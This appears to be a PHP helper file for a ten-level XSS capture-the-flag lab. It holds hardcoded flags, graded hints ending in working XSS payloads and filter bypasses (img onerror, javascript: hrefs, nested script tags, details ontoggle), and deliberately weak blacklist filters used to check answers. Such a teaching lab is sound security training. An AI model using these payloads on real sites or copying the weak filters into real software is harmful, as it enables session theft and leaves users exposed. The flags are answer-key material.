<?php
/**
 * XSS Lab - Helper Functions
 * Utility functions for the XSS challenge lab.
 */

/**
 * Returns the flag string for a given level ID.
 */
function get_flag_for_level(int $levelId): string {
    $flags = [
        1  => 'FLAG{reflected_xss_basic}',
        2  => 'FLAG{attribute_context_xss}',
        3  => 'FLAG{stored_xss_file}',
        4  => 'FLAG{dom_xss_innerHTML}',
        5  => 'FLAG{htmlspecialchars_single_quote}',
        6  => 'FLAG{script_filter_bypass}',
        7  => 'FLAG{javascript_href_xss}',
        8  => 'FLAG{json_innerHTML_xss}',
        9  => 'FLAG{blacklist_bypass_xss}',
        10 => 'FLAG{waf_multilayer_xss}',
    ];
    return $flags[$levelId] ?? '';
}

/**
 * Returns an array of 5 progressive hints for each level.
 */
function get_level_hints(int $levelId): array {
    $hints = [
        1 => [
            'Look at the vulnerable line: the <code>$name</code> variable from <code>$_GET[\'name\']</code> is concatenated directly into the HTML string with <strong>no sanitization at all</strong>.',
            'Since there is no <code>htmlspecialchars()</code>, any HTML tags you inject become part of the page\'s real DOM. Try submitting <code>&lt;b&gt;bold&lt;/b&gt;</code> — does the text become bold?',
            'A <code>&lt;script&gt;</code> tag placed in the input will be executed by the browser as JavaScript code.',
            'You can also use event-based vectors that do not require a <code>&lt;script&gt;</code> tag, such as an <code>&lt;img&gt;</code> tag with an <code>onerror</code> event handler.',
            'Working payloads: <code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code> &nbsp;|&nbsp; <code>?name=&lt;img src=x onerror=alert(1)&gt;</code> &nbsp;|&nbsp; <code>?name=&lt;svg onload=alert(1)&gt;</code>',
        ],
        2 => [
            'Compare the two <code>htmlspecialchars()</code> calls carefully: the <code>&lt;input&gt;</code> uses <code>ENT_NOQUOTES</code>, but the <code>&lt;p&gt;</code> tag uses <code>ENT_QUOTES</code>.',
            '<code>ENT_NOQUOTES</code> means the double-quote character (<code>"</code>) is <strong>NOT</strong> converted to <code>&amp;quot;</code>. Single and double quotes both pass through unescaped.',
            'The <code>value</code> attribute is delimited with double quotes: <code>value="..."</code>. If a <code>"</code> in your input is not escaped, you can close the attribute early and add new attributes.',
            'After injecting <code>"</code> to break out of the <code>value="..."</code> context, you can append an event handler attribute like <code>onmouseover="alert(1)"</code>.',
            'Working payloads: <code>?q=" onmouseover="alert(1)</code> &nbsp;|&nbsp; <code>?q=" onfocus="alert(1)" autofocus="</code> &nbsp;|&nbsp; <code>?q=" onpointerenter="alert(1)</code>',
        ],
        3 => [
            'This is <strong>Stored XSS</strong>. Your payload is saved to a file on the server and displayed to <em>every</em> visitor — not just you.',
            'Look at the output code: <code>echo "&lt;div&gt;" . $c[\'text\'] . "&lt;/div&gt;";</code> — there is <strong>no</strong> <code>htmlspecialchars()</code> on the <code>text</code> field when it is rendered.',
            'The <code>author</code> field is also unescaped, but the <strong>comment text</strong> field is what you need to weaponize for the flag check.',
            'Submit a comment with an XSS payload in the <em>comment</em> field. It will be stored and then re-rendered as raw HTML.',
            'Working payloads (in the comment field): <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> &nbsp;|&nbsp; <code>&lt;img src=x onerror=alert(1)&gt;</code>',
        ],
        4 => [
            'This is <strong>DOM-based XSS</strong>. The server never processes your payload — the JavaScript on the page reads the URL and creates the vulnerability entirely on the client side.',
            'The <code>innerHTML</code> property parses HTML markup. Assigning <code>element.innerHTML = "&lt;img src=x onerror=alert(1)&gt;"</code> creates a real DOM element that fires the event.',
            'Note: <code>&lt;script&gt;</code> tags injected via <code>innerHTML</code> do <em>not</em> execute directly. Use event-handler-based payloads instead.',
            'The <code>msg</code> GET parameter is read by <code>URLSearchParams</code> in JavaScript. Try modifying the URL directly: add <code>?msg=YOUR_PAYLOAD</code>.',
            'Working payloads: <code>?msg=&lt;img src=x onerror=alert(1)&gt;</code> &nbsp;|&nbsp; <code>?msg=&lt;svg onload=alert(1)&gt;</code> &nbsp;|&nbsp; <code>?msg=&lt;details open ontoggle=alert(1)&gt;</code>',
        ],
        5 => [
            '<code>htmlspecialchars()</code> called with <strong>default flags</strong> (<code>ENT_COMPAT</code>) escapes <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, and double-quotes — but <strong>NOT</strong> single-quotes.',
            'The attribute uses <strong>single quotes</strong>: <code>value=\'...\'</code>. Because single quotes are not escaped, you can inject a <code>\'</code> to close the attribute value prematurely.',
            'After closing the attribute with <code>\'</code>, you are now in the tag context and can add any additional HTML attributes, including event handlers.',
            'Append an event handler right after your closing single quote: <code>\' onfocus=\'alert(1)\'</code>. Adding <code>autofocus</code> makes the event fire automatically on page load.',
            'Working payloads: <code>?bio=\' onfocus=\'alert(1)\' autofocus=\'</code> &nbsp;|&nbsp; <code>?bio=\' onmouseover=\'alert(1)</code> &nbsp;|&nbsp; <code>?bio=\' onpointerenter=\'alert(1)</code>',
        ],
        6 => [
            'The filter uses <code>str_replace(\'&lt;script&gt;\', \'\', $input)</code> — PHP\'s <code>str_replace</code> is <strong>case-sensitive</strong>. It only removes the exact lowercase string <code>&lt;script&gt;</code>.',
            'What happens with <code>&lt;SCRIPT&gt;</code>, <code>&lt;Script&gt;</code>, or <code>&lt;sCrIpT&gt;</code>? The filter will not touch these uppercase or mixed-case variants.',
            'Another approach: skip <code>&lt;script&gt;</code> entirely and use an HTML tag with an inline event handler, such as <code>&lt;img src=x onerror=alert(1)&gt;</code>. The filter does not touch event handlers.',
            '<strong>Nested bypass technique:</strong> <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code>. After the filter removes <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code>, the remaining characters assemble a new <code>&lt;script&gt;</code> tag.',
            'Working payloads: <code>?input=&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code> &nbsp;|&nbsp; <code>?input=&lt;img src=x onerror=alert(1)&gt;</code> &nbsp;|&nbsp; <code>?input=&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code>',
        ],
        7 => [
            'The <code>href</code> attribute receives your <code>url</code> parameter directly with <strong>no URL scheme validation</strong>.',
            'Browsers support the <code>javascript:</code> pseudo-protocol in <code>href</code> attributes. Clicking a link with <code>href="javascript:code"</code> executes that JavaScript.',
            'There is no check to ensure the URL starts with <code>http://</code> or <code>https://</code>. Any string — including <code>javascript:alert(1)</code> — is accepted as-is.',
            'After submitting your payload, you must <strong>click the rendered link</strong> ("Visit Profile") to trigger the JavaScript execution. The server also verifies the payload for the flag.',
            'Working payloads: <code>?url=javascript:alert(1)</code> &nbsp;|&nbsp; <code>?url=javascript:alert(document.cookie)</code> &nbsp;|&nbsp; <code>?url=javascript:void(alert(\'XSS\'))</code>',
        ],
        8 => [
            'The PHP endpoint returns your <code>message</code> parameter <em>inside</em> a JSON object. The client-side JavaScript then extracts <code>data.message</code> and assigns it to <code>innerHTML</code>.',
            'JSON encoding wraps your string in quotes and escapes certain characters — but it does <strong>not</strong> HTML-encode the content. The raw HTML tags survive inside the JSON string.',
            'When the client receives the JSON and does <code>element.innerHTML = data.message</code>, the browser parses the string as HTML and executes any embedded scripts or event handlers.',
            'The server-side PHP also verifies your payload: if your <code>message</code> param contains a valid XSS vector, the flag is shown on the page.',
            'Working payloads: <code>?message=&lt;img src=x onerror=alert(1)&gt;</code> &nbsp;|&nbsp; <code>?message=&lt;svg onload=alert(1)&gt;</code> &nbsp;|&nbsp; <code>?message=&lt;details open ontoggle=alert(1)&gt;</code>',
        ],
        9 => [
            'The blacklist only blocks four specific strings: <code>&lt;script</code>, <code>javascript:</code>, <code>onload=</code>, and <code>onclick=</code>. The check uses <code>stripos</code> (case-insensitive), but the list is <em>very</em> short.',
            'HTML supports <strong>hundreds</strong> of event handler attributes. Think about which common ones are <em>not</em> on the list.',
            'Event handlers such as <code>onerror=</code>, <code>onmouseover=</code>, <code>onfocus=</code>, <code>onpointerenter=</code>, and <code>ontoggle=</code> are all absent from the blacklist.',
            'Combine an HTML tag with one of the unlisted event handlers: <code>&lt;img src=x onerror=alert(1)&gt;</code>. The PHP will echo it directly and the browser will execute it.',
            'Working payloads: <code>?xss=&lt;img src=x onerror=alert(1)&gt;</code> &nbsp;|&nbsp; <code>?xss=&lt;svg onmouseover=alert(1)&gt;</code> &nbsp;|&nbsp; <code>?xss=&lt;details open ontoggle=alert(1)&gt;</code>',
        ],
        10 => [
            'There are three filter layers. Layer 1 strips <code>&lt;script&gt;</code> tags (case-insensitive). Layer 2 removes six specific event handlers. Layer 3 strips HTML comments. Study what is <em>not</em> covered.',
            'The event handler blacklist in Layer 2: <code>onerror=</code>, <code>onload=</code>, <code>onclick=</code>, <code>onfocus=</code>, <code>onmouseover=</code>, <code>javascript:</code>. That\'s six entries. There are hundreds more.',
            'Modern browsers support events like <code>ontoggle=</code>, <code>onpointerenter=</code>, <code>onpointerover=</code>, <code>onanimationstart=</code>, <code>oncontextmenu=</code>, <code>onwheel=</code> — none of which appear in the blacklist.',
            'The <code>&lt;details&gt;</code> HTML element fires its <code>ontoggle</code> event when it opens or closes. Adding the <code>open</code> attribute makes it fire <em>immediately</em> on page load without any user interaction.',
            'Working payloads: <code>?payload=&lt;details ontoggle=alert(1) open&gt;</code> &nbsp;|&nbsp; <code>?payload=&lt;svg onpointerenter=alert(1)&gt;hover&lt;/svg&gt;</code> &nbsp;|&nbsp; <code>?payload=&lt;img src=x onpointerover=alert(1)&gt;</code>',
        ],
    ];
    return $hints[$levelId] ?? [];
}

/**
 * Renders a progressive hint section with a "Show Next Hint" button.
 * Each call shares the same JS listener (rendered only once via static flag).
 */
function render_hint_section(array $hints, string $title = 'Hints'): string {
    if (empty($hints)) return '';
    static $scriptRendered = false;
    $id = uniqid('hint_', false);
    ob_start();
    ?>
    <div class="hints" id="<?= $id ?>">
        <h3><?= htmlspecialchars($title) ?></h3>
        <button class="hint-btn" data-hint-target="<?= $id ?>">Show Next Hint (0/<?= count($hints) ?>)</button>
        <ul class="hint-list">
            <?php foreach ($hints as $hint): ?>
            <li class="hint-item" hidden><?= $hint ?></li>
            <?php endforeach; ?>
        </ul>
    </div>
    <?php
    if (!$scriptRendered) {
        $scriptRendered = true;
        ?>
        <script>
        document.addEventListener('click', function(e) {
            if (!e.target.classList.contains('hint-btn')) return;
            const targetId = e.target.getAttribute('data-hint-target');
            const container = document.getElementById(targetId);
            const items = container.querySelectorAll('.hint-item[hidden]');
            const total = container.querySelectorAll('.hint-item').length;
            if (items.length > 0) {
                items[0].removeAttribute('hidden');
                const shown = total - items.length + 1;
                e.target.textContent = shown < total ? 'Show Next Hint (' + shown + '/' + total + ')' : 'All hints shown';
                if (shown >= total) e.target.disabled = true;
            }
        });
        </script>
        <?php
    }
    return ob_get_clean();
}

/**
 * Verifies whether a submitted payload is a valid XSS vector for the given level.
 * Each level has unique logic matching the specific vulnerability being demonstrated.
 */
function verify_xss_payload(int $level, string $input): bool {
    switch ($level) {
        case 1:
            // Basic reflected — any standard XSS vector
            return (bool)(
                preg_match('/<script[\s>]/i', $input) ||
                preg_match('/on\w+\s*=/i', $input) ||
                preg_match('/<img|<svg|<iframe/i', $input)
            );

        case 2:
            // Must break out of double-quoted attribute: needs " + event handler
            return strpos($input, '"') !== false && (bool)preg_match('/on\w+\s*=/i', $input);

        case 3:
            // Stored XSS — same check as level 1
            return (bool)(
                preg_match('/<script[\s>]/i', $input) ||
                preg_match('/on\w+\s*=/i', $input) ||
                preg_match('/<img|<svg|<iframe/i', $input)
            );

        case 4:
            // DOM innerHTML — img/svg/script with event handler
            return (bool)(
                preg_match('/<img|<svg|<script[\s>]/i', $input) ||
                preg_match('/on\w+\s*=/i', $input)
            );

        case 5:
            // Must break single-quoted attribute: needs ' + event handler
            return strpos($input, "'") !== false && (bool)preg_match('/on\w+\s*=/i', $input);

        case 6:
            // Filter removes lowercase <script> only — payload must survive the same filter
            $filtered = str_replace('<script>', '', $input);
            $filtered = str_replace('</script>', '', $filtered);
            return (bool)(
                preg_match('/<script[\s>]/i', $filtered) ||
                preg_match('/on\w+\s*=/i', $filtered) ||
                preg_match('/<img|<svg/i', $filtered)
            );

        case 7:
            // href javascript: scheme OR single-quote attribute escape with event
            return stripos($input, 'javascript:') !== false ||
                   (strpos($input, "'") !== false && (bool)preg_match('/on\w+\s*=/i', $input));

        case 8:
            // JSON -> innerHTML — any HTML XSS vector
            return (bool)(
                preg_match('/<img|<svg|<script[\s>]/i', $input) ||
                preg_match('/on\w+\s*=/i', $input)
            );

        case 9:
            // Blacklist bypass — payload must NOT contain blacklisted strings
            // but still carry a valid XSS vector
            $bl = false;
            foreach (['<script', 'javascript:', 'onload=', 'onclick='] as $b) {
                if (stripos($input, $b) !== false) {
                    $bl = true;
                    break;
                }
            }
            return !$bl && (
                (bool)preg_match('/on\w+\s*=/i', $input) ||
                (bool)preg_match('/<img|<svg/i', $input)
            );

        case 10:
            // Multi-layer WAF: apply all filters, then check if XSS survives
            $x = $input;
            // Layer 1: strip script tags (case-insensitive, multiline)
            $x = preg_replace('/<script.*?>/is', '', $x);
            $x = preg_replace('/<\/script>/is', '', $x);
            // Layer 2: strip common event handlers and javascript:
            foreach (['javascript:', 'onerror=', 'onload=', 'onclick=', 'onfocus=', 'onmouseover='] as $b) {
                $x = str_ireplace($b, '', $x);
            }
            // Layer 3: strip HTML comments
            $x = preg_replace('/<!--[\s\S]*?-->/', '', $x);
            return (bool)(
                preg_match('/on\w+\s*=/i', $x) ||
                preg_match('/<img|<svg|<details/i', $x)
            );

        default:
            return false;
    }
}

/**
 * Handle inline flag submission on a level page.
 * Only acts when POST contains _flag_submit=1.
 *
 * @return array{status: string|null, message: string, already_completed: bool}
 */
function handle_inline_flag_submit(int $levelId): array
{
    $result = ['status' => null, 'message' => '', 'already_completed' => false];

    $completed = [];
    if (!empty($_COOKIE['xss_lab_progress'])) {
        $decoded = json_decode($_COOKIE['xss_lab_progress'], true);
        if (is_array($decoded)) $completed = $decoded;
    }
    $result['already_completed'] = in_array($levelId, $completed);

    if ($_SERVER['REQUEST_METHOD'] !== 'POST' || empty($_POST['_flag_submit'])) {
        return $result;
    }

    $flag = trim($_POST['submitted_flag'] ?? '');
    if ($flag === '') {
        $result['status']  = 'error';
        $result['message'] = 'Please enter a flag.';
        return $result;
    }

    if ($flag === get_flag_for_level($levelId)) {
        if (!in_array($levelId, $completed)) {
            $completed[] = $levelId;
            sort($completed);
            setcookie('xss_lab_progress', json_encode($completed), time() + 86400 * 30, '/');
        }
        $result['status']           = 'success';
        $result['message']          = 'Correct! Flag accepted.';
        $result['already_completed'] = true;
    } else {
        $result['status']  = 'error';
        $result['message'] = 'Incorrect flag. Keep trying!';
    }

    return $result;
}

/**
 * Render the compact inline flag submit form.
 *
 * @param array{status: string|null, message: string, already_completed: bool} $result
 */
function render_inline_flag_form(int $levelId, array $result): string
{
    $status          = $result['status'] ?? null;
    $message         = $result['message'] ?? '';
    $alreadyCompleted = $result['already_completed'] ?? false;

    ob_start();
    ?>
    <div class="inline-flag-submit">
        <h3>Submit Flag</h3>
        <div class="form-inner">
            <?php if ($status === 'success'): ?>
                <div class="message success"><?= htmlspecialchars($message) ?> &mdash; <a href="submit.php">view all progress &rarr;</a></div>
            <?php elseif ($status === 'error'): ?>
                <div class="message error"><?= htmlspecialchars($message) ?></div>
            <?php endif; ?>
            <?php if ($alreadyCompleted && $status !== 'success'): ?>
                <div class="message info">Level <?= (int)$levelId ?> already completed. <a href="submit.php">View progress &rarr;</a></div>
            <?php endif; ?>
            <?php if (!$alreadyCompleted || $status === 'error'): ?>
            <form method="POST" action="">
                <input type="hidden" name="_flag_submit" value="1">
                <div class="inline-flag-row">
                    <input type="text" name="submitted_flag" class="form-control"
                           placeholder="FLAG{...}" autocomplete="off" spellcheck="false"
                           value="<?= htmlspecialchars($_POST['submitted_flag'] ?? '') ?>">
                    <button type="submit" class="btn btn-primary">Check</button>
                </div>
            </form>
            <?php endif; ?>
        </div>
    </div>
    <?php
    return ob_get_clean();
}
